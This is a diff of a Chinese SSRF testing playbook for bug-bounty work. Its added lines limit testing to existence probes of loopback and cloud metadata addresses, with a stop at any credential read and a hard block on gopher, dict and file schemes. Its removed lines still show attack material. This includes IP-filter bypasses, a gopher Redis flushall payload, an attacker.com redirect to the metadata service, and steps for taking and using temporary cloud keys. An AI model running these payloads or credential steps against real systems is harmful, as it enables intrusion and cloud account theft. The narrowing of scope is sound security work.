@@ -1,4 +1,9 @@
-> 短表「云厂商元数据路径差」「公开 GOPROXY」用标题搜。英文补充/附件已砍；云元数据路径差和绕过仍在上半。
+> **SRC 红线：** SSRF 要证明「服务端会替你发请求」。HTTP(S) 打回连 / FLAG /
+> `127.0.0.1` / RFC1918 一口 / `169.254.169.254` / `metadata.google.internal`
+> 都是存在性探针，要发。读到 IAM 目录或临时钥记 finding 就停；不拿钥调云 API、
+> 不扫整段内网。`gopher` / `dict` / `file` / `ldap` 仍硬拒（打 Redis 是后利用）。
+>
+> 短表「云厂商元数据路径差」「公开 GOPROXY」用标题搜。英文补充/附件已砍。
 
 ## 一、原有知识库
 
@@ -29,41 +34,19 @@ curl "https://target.com/api/preview?url=http://$DNSLOG/test"
 # 有记录 → SSRF 存在
 ```
 
-### 内网探测（确认 SSRF 后）
+### 内网 / 云元数据 —— 存在性要打，后利用停
 
-```bash
-# 探测内网常用 IP 段
-for ip in 192.168.1.{1..254}; do
-  echo "?url=http://$ip"
-done
+HTTP(S) 让目标去取这些地址，用来证明 SSRF：
 
-# 探测内网服务端口
-?url=http://192.168.1.1:6379/   # Redis
-?url=http://192.168.1.1:27017/  # MongoDB
-?url=http://192.168.1.1:8080/   # 内网 Web
-?url=http://192.168.1.1:22/     # SSH（通过响应时间判断）
+```
+http://127.0.0.1/
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+http://10.x.x.x/  （一口，不扫整段）
 ```
 
-### 云服务 Metadata（重点）
-
-```bash
-# AWS EC2 Metadata（严重危害，可获取 IAM 凭证）
-?url=http://169.254.169.254/latest/meta-data/
-?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# 国内云 ECS 元数据
-?url=http://100.100.100.200/latest/meta-data/
-?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/
-
-# GCP Metadata
-?url=http://metadata.google.internal/computeMetadata/v1/
-
-# 云厂商（目录通了还要取钥匙，见下「云厂商元数据路径差」）
-?url=http://厂商元数据域名/latest/meta-data/
-?url=http://厂商元数据域名/latest/meta-data/cam/security-credentials/
-?url=http://厂商元数据域名/latest/meta-data/cam/service-role-security-credentials/<ROLE>
-?url=http://169.254.169.254/latest/meta-data/
-```
+读到 IAM 目录、角色名或临时钥 → 记 finding 就停。不拿这把钥调云 API，不扫 RFC1918 整段，不用 `gopher` 打 Redis。
 
 ### 云厂商元数据路径差 / 回环拦了元数据没拦 / 云开发匿名代理（短表有指针）
 
@@ -71,12 +54,12 @@ done
 
 打：
 
-1. **过滤对照。** 先打 `http://127.0.0.1/`，再打 `http://厂商元数据域名/latest/meta-data/` 和 `http://169.254.169.254/latest/meta-data/`。回环 403、`Forbidden Loopback` ≠ 元数据也拦了。只拦回环字符串、不按解析后的 IP 再拦云元数据域名，继续打。
-2. **钥匙路径。** 目录通了先读角色名（`cam/security-credentials/` 下列表）。再取临时钥匙：`cam/security-credentials/角色名` 常 404，**必须再打** `cam/service-role-security-credentials/角色名`。按 AWS `iam/security-credentials/` 菜谱在 404 停手 = 漏钥匙。
-3. **匿名网关当入口。** 官方演示环境、匿名登录拿到的 token，**不当「已经登录、权限内」**。带着它打 `*proxy*` 的 URL 参。别的环境同一接口可能禁掉，换环境继续试，不把一处禁掉当成全产品安全。
-4. **固定 POST 的开放代理。** 直打元数据 405（IMDS 只吃 GET）≠ 没洞。先打公网 302（`redirect-to` 一类）把 Location 指到 `http://100.100.100.200/latest/meta-data/ram/security-credentials/角色`，让代理跟跳转时改成 GET。国内云角色列在 `ram/security-credentials/`。钥拿去 STS GetCallerIdentity。
+1. 先回连或 FLAG，再打 `127.0.0.1` 与 `169.254.169.254` 做过滤对照。
+2. 目录通了钥匙走 `cam/service-role-security-credentials/角色`（或 AWS/GCP 对应路径）。读到钥就停。
+3. **拿到 AK/SK / 角色名就停。** 不拿钥调云 API。
+4. **匿名网关。** 带着匿名 token 打 `*proxy*` 时，目标可以是回连、FLAG 或元数据 HTTP(S)。
 
-算成：回显元数据正文，或拿到 `TmpSecretId` / `TmpSecretKey` / `Token`，再用这三样调云 API（`GetCallerIdentity` 一类）对上主账号。ListBuckets 403 别停，再签 CLS `DescribeConfigs` 看采集配置/主题。只读到 instance-id、钥匙 404 或调不通 → 还没成。
+算成：回连收到服务端请求，或 FLAG 证明页，或元数据/IAM 目录回显。取到临时钥匙再调云 API 属于后利用，不要做。
 
 假点：代理只允许模型厂商白名单、元数据也 403；匿名开了但代理对匿名关死；钥匙是窄角色且没证明能调任何云 API（半条，别空喊接管全账号）。单站没中不删短表这行。
 
@@ -98,25 +81,7 @@ done
 
 ## 绕过技巧
 
-```bash
-# 绕过 IP 黑名单
-http://127.0.0.1/    → http://2130706433/       # 十进制 IP
-                     → http://0177.0.0.1/        # 八进制
-                     → http://0x7f000001/         # 十六进制
-                     → http://127.1/             # 简写
-
-# 绕过 localhost 过滤
-http://localhost/    → http://[::1]/             # IPv6
-                     → http://127.0.0.1.xip.io/ # DNS 解析到 127
-
-# 协议变换
-http://internal-host/ → file:///etc/passwd
-                      → gopher://127.0.0.1:6379/_*1...（打 Redis）
-                      → dict://127.0.0.1:6379/info
-
-# URL 重定向绕过
-搭建重定向服务: http://attacker.com/redirect → 302 → http://169.254.169.254/
-```
+绕过用在 HTTP(S) 回连 / FLAG / 回环 / 元数据上。`gopher`/`dict`/`file`/`ldap` 仍硬拒。
 
 ### COS 回源竞态（见了回源再打）
 
@@ -132,15 +97,9 @@ http://internal-host/ → file:///etc/passwd
 
 假点：回源不跟 302；检测和下载走同一时刻缓存；你控不了回源目标。不进短表（要自己能配回源，偏窄）。
 
-## gopher 协议打内网服务
+## gopher 协议打内网服务 —— 禁止
 
-```bash
-# 打 Redis（写 webshell 或计划任务）
-# gopher://127.0.0.1:6379/_RESP编码的命令
-?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
-
-# 工具生成 gopher payload
-# gopherus: python gopherus.py --exploit redis
-```
+`gopher://` / `dict://` / `file://` 闸门硬拒（`hazardous_payload:dangerous_scheme`）。
+不打 Redis、不写 webshell、不 flushall。证明 SSRF 用 HTTPS 回连即可。
 
 ---
